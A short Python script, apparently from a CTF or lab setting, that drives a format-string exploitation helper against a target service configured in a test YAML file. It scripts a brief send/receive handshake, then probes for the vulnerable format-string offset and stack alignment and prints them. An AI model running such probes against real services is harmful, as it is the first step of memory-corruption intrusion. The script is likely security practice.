from tools.string_bug import FormatStringExploit
from dispatcher import Dispatcher
import yaml

def load_config(path):
    with open(path, "r") as f:
        return yaml.safe_load(f)
init_instructions = [
    ["recv", 1024],
    ["send", "toto"],
    ["recv", 1024],
    ["send", "tata"],
    ["recv", 1024],
    ]
dispatcher = Dispatcher(load_config("config/test_config.yml"))
exploit = FormatStringExploit(dispatcher, verbose=True)
exploit.setup_init_instructions(init_instructions)
exploit.find_offset(max_offset=100, delay_between_request=0.1, connect_and_close=False, retry_on_error=False)
print(exploit.offset)
print(exploit.stack_alignment)